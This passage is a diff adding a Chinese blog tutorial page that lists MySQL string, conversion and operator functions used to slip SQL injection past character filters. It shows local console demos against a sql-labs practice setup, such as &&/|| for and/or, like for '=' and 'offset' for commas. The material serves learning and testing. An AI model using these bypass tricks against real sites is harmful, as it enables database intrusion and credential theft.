@@ -1,0 +1,684 @@
+
+ <!DOCTYPE HTML>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  
+    <title>06,sql注入专题之mysql常用绕过函数总结 | D&#39;Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="D">
+    
+
+    
+    <meta name="description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是SQL注入的过滤总结">
+<meta name="keywords" content="web安全,sql注入,mysql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="06,sql注入专题之mysql常用绕过函数总结">
+<meta property="og:url" content="http://blog.wangluomingong.top/2019/01/23/06,SQL注入字符串过滤总结/index.html">
+<meta property="og:site_name" content="D&#39;Blog">
+<meta property="og:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是SQL注入的过滤总结">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-01-23T12:50:17.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="06,sql注入专题之mysql常用绕过函数总结">
+<meta name="twitter:description" content="声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负    总结一下sql注入，这个是SQL注入的过滤总结">
+
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/jacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+  
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2019/01/23/06,SQL注入字符串过滤总结/" title="06,sql注入专题之mysql常用绕过函数总结" itemprop="url">06,sql注入专题之mysql常用绕过函数总结</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="/about" title="D" target="_blank" itemprop="author">D</a>
+		
+  </p><p class="article-time">
+    <time datetime="2019-01-22T16:00:00.000Z" itemprop="datePublished"> Published 2019-01-23</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		<html><body style="padding: 20px;"><marquee><span style="font-weight: bolder;font-size: 20px;color: red;"><a href="https://www.youtube.com/channel/UCiO_qNDegcpV4cUhkFc22lA?view_as=subscriber" target="_blank" rel="noopener"><font color="red">声明：本文仅供交流学习使用，严禁利用所学技术违法犯罪，否则后果自负</font></a></span></marquee></body></html>
+
+
+
+<p>总结一下sql注入，这个是SQL注入的过滤总结</p>
+<a id="more"></a>
+
+
+
+<h2 id="一，环境部署"><a href="#一，环境部署" class="headerlink" title="一，环境部署"></a>一，环境部署</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull duwentao/sql-labs:1.0</span><br></pre></td></tr></table></figure>
+
+<h2 id="二，截断字符串函数"><a href="#二，截断字符串函数" class="headerlink" title="二，截断字符串函数"></a>二，截断字符串函数</h2><p>1，mid(column_name,start,length)</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>column_name</td>
+<td>必需。要提取字符的字段。</td>
+</tr>
+<tr>
+<td>start</td>
+<td>必需。规定开始位置（起始值是 1）。</td>
+</tr>
+<tr>
+<td>length</td>
+<td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(&quot;abc&quot;,1,1);</span><br><span class="line">+----------------+</span><br><span class="line">| mid(&quot;abc&quot;,1,1) |</span><br><span class="line">+----------------+</span><br><span class="line">| a              |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(&quot;abc&quot;,2,1);</span><br><span class="line">+----------------+</span><br><span class="line">| mid(&quot;abc&quot;,2,1) |</span><br><span class="line">+----------------+</span><br><span class="line">| b              |</span><br><span class="line">+----------------+</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt; select mid(&quot;abc&quot;,2,2);</span><br><span class="line">+----------------+</span><br><span class="line">| mid(&quot;abc&quot;,2,2) |</span><br><span class="line">+----------------+</span><br><span class="line">| bc             |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>2, substr用法同上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abc&quot;,1,2);</span><br><span class="line">+-------------------+</span><br><span class="line">| substr(&quot;abc&quot;,1,2) |</span><br><span class="line">+-------------------+</span><br><span class="line">| ab                |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substr(&quot;abc&quot;,1,1);</span><br><span class="line">+-------------------+</span><br><span class="line">| substr(&quot;abc&quot;,1,1) |</span><br><span class="line">+-------------------+</span><br><span class="line">| a                 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>3，substring 用法同上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select substring(&quot;abc&quot;,1,1);</span><br><span class="line">+----------------------+</span><br><span class="line">| substring(&quot;abc&quot;,1,1) |</span><br><span class="line">+----------------------+</span><br><span class="line">| a                    |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select substring(&quot;abc&quot;,1,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| substring(&quot;abc&quot;,1,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">| ab                   |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>4,left(str,length);</p>
+<p><code>left()</code>函数接受两个参数：</p>
+<ul>
+<li><code>str</code>是要提取子字符串的字符串。</li>
+<li><code>length</code>是一个正整数，指定将从左边返回的字符数。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(&quot;abc&quot;,1);</span><br><span class="line">+---------------+</span><br><span class="line">| left(&quot;abc&quot;,1) |</span><br><span class="line">+---------------+</span><br><span class="line">| a             |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select left(&quot;abc&quot;,2);</span><br><span class="line">+---------------+</span><br><span class="line">| left(&quot;abc&quot;,2) |</span><br><span class="line">+---------------+</span><br><span class="line">| ab            |</span><br><span class="line">+---------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>5，right和4相反</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(&quot;abc&quot;,2);</span><br><span class="line">+----------------+</span><br><span class="line">| right(&quot;abc&quot;,2) |</span><br><span class="line">+----------------+</span><br><span class="line">| bc             |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>6, reverse反转字符串，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select reverse(&quot;abc&quot;);</span><br><span class="line">+----------------+</span><br><span class="line">| reverse(&quot;abc&quot;) |</span><br><span class="line">+----------------+</span><br><span class="line">| cba            |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>7, LOCATE(substr,str,pos)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select locate(&quot;a&quot;,&quot;abcd&quot;,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| locate(&quot;a&quot;,&quot;abcd&quot;,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    0 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select locate(&quot;c&quot;,&quot;abcd&quot;,2);</span><br><span class="line">+----------------------+</span><br><span class="line">| locate(&quot;c&quot;,&quot;abcd&quot;,2) |</span><br><span class="line">+----------------------+</span><br><span class="line">|                    3 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="三，字符串转换函数"><a href="#三，字符串转换函数" class="headerlink" title="三，字符串转换函数"></a>三，字符串转换函数</h2><p>1，char</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select char(66);</span><br><span class="line">+----------+</span><br><span class="line">| char(66) |</span><br><span class="line">+----------+</span><br><span class="line">| B        |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>2，ascii</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(&quot;a&quot;);</span><br><span class="line">+------------+</span><br><span class="line">| ascii(&quot;a&quot;) |</span><br><span class="line">+------------+</span><br><span class="line">|         97 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>3,  hex和unhex</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select hex(&quot;a&quot;);</span><br><span class="line">+----------+</span><br><span class="line">| hex(&quot;a&quot;) |</span><br><span class="line">+----------+</span><br><span class="line">| 61       |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select unhex(61);</span><br><span class="line">+-----------+</span><br><span class="line">| unhex(61) |</span><br><span class="line">+-----------+</span><br><span class="line">| a         |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="四，替换"><a href="#四，替换" class="headerlink" title="四，替换"></a>四，替换</h2><p>1，替换等号：like</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tdb_admin;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot;;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username like &quot;admin&quot;;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>2， 替换逗号一</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; limit 0,1;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; limit 1 offset 1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; limit 1 offset 0;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3，替换逗号二</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(version(),1,1);</span><br><span class="line">+--------------------+</span><br><span class="line">| mid(version(),1,1) |</span><br><span class="line">+--------------------+</span><br><span class="line">| 8                  |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid(version() from 1 for 1);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| mid(version() from 1 for 1) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| 8                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>4, 使用&amp;&amp;替换and </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; and 1 = 1;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; &amp;&amp;  1 = 1;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>5, or的代替者||</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; or  1 = 1;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; or  1 = 2;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from tdb_admin where username=&quot;admin&quot; ||  1 = 2;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 7fef6171469e80d32c0559f88b377245 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>6, 判断被过滤的字符和length结合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1 ^ 1 ;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 1 |</span><br><span class="line">+-------+</span><br><span class="line">|     0 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ 0 ;</span><br><span class="line">+-------+</span><br><span class="line">| 1 ^ 0 |</span><br><span class="line">+-------+</span><br><span class="line">|     1 |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ length(&quot;&quot;)=0 ;</span><br><span class="line">+------------------+</span><br><span class="line">| 1 ^ length(&quot;&quot;)=0 |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select 1 ^ length(&quot;&quot;)=1 ;</span><br><span class="line">+------------------+</span><br><span class="line">| 1 ^ length(&quot;&quot;)=1 |</span><br><span class="line">+------------------+</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>7, between xxx  and  xxx</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select &quot;b&quot; between &quot;a&quot;  and &quot;c&quot;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &quot;b&quot; between &quot;a&quot;  and &quot;c&quot; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        1 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;d&quot; between &quot;a&quot;  and &quot;c&quot;;</span><br><span class="line">+--------------------------+</span><br><span class="line">| &quot;d&quot; between &quot;a&quot;  and &quot;c&quot; |</span><br><span class="line">+--------------------------+</span><br><span class="line">|                        0 |</span><br><span class="line">+--------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;d&quot; between hex(&quot;a&quot;)  and hex(&quot;c&quot;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| &quot;d&quot; between hex(&quot;a&quot;)  and hex(&quot;c&quot;) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;b&quot; between hex(&quot;a&quot;)  and hex(&quot;c&quot;);</span><br><span class="line">+------------------------------------+</span><br><span class="line">| &quot;b&quot; between hex(&quot;a&quot;)  and hex(&quot;c&quot;) |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select hex(&quot;b&quot;) between hex(&quot;a&quot;)  and hex(&quot;c&quot;);</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| hex(&quot;b&quot;) between hex(&quot;a&quot;)  and hex(&quot;c&quot;) |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                       1 |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>8, in 和not in</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &quot;b&quot; in(&quot;a&quot;,&quot;b&quot;);</span><br><span class="line">+-----------------+</span><br><span class="line">| &quot;b&quot; in(&quot;a&quot;,&quot;b&quot;) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               1 |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &quot;b&quot; not in(&quot;a&quot;,&quot;b&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| &quot;b&quot; not in(&quot;a&quot;,&quot;b&quot;) |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   0 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h2 id="五，字符串连接函数"><a href="#五，字符串连接函数" class="headerlink" title="五，字符串连接函数"></a>五，字符串连接函数</h2><p>1，concat返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select concat(&apos;11&apos;,&apos;22&apos;,&apos;33&apos;);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&apos;11&apos;,&apos;22&apos;,&apos;33&apos;) |</span><br><span class="line">+------------------------+</span><br><span class="line">| 112233                 |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select concat(&apos;11&apos;,&apos;22&apos;,null);</span><br><span class="line">+------------------------+</span><br><span class="line">| concat(&apos;11&apos;,&apos;22&apos;,null) |</span><br><span class="line">+------------------------+</span><br><span class="line">| NULL                   |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>2,  repeat()函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select repeat(&apos;ab&apos;,2);</span><br><span class="line">+----------------+</span><br><span class="line">| repeat(&apos;ab&apos;,2) |</span><br><span class="line">+----------------+</span><br><span class="line">| abab           |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select repeat(&apos;a&apos;,2);</span><br><span class="line">+---------------+</span><br><span class="line">| repeat(&apos;a&apos;,2) |</span><br><span 